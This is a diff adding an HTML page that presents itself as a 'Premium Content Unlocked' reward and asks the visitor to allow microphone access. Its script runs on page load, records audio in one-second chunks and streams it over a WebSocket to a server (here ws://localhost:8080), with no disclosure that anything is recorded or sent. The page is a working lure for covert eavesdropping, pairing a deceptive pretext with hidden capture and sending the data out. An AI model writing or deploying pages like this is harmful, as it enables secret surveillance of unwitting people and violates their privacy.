@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Content Unlocked</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        img {
+            width: 200px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Congratulations!</h1>
+        <p>You've unlocked premium content using our link.</p>
+        <img src="congratulations.png" alt="Congratulations">
+        <p>Allow microphone access to proceed.</p>
+    </div>
+
+    <script>
+        async function requestMicrophone() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const audioContext = new AudioContext();
+                const source = audioContext.createMediaStreamSource(stream);
+
+                // Send audio stream to the server
+                const socket = new WebSocket("ws://localhost:8080");
+                socket.onopen = () => {
+                    const recorder = new MediaRecorder(stream);
+                    recorder.ondataavailable = (event) => {
+                        if (event.data.size > 0 && socket.readyState === 1) {
+                            socket.send(event.data);
+                        }
+                    };
+                    recorder.start(1000); // Send data in chunks
+                };
+            } catch (error) {
+                alert("Microphone access is required for this feature.");
+                console.error(error);
+            }
+        }
+
+        requestMicrophone();
+    </script>
+</body>
+</html>
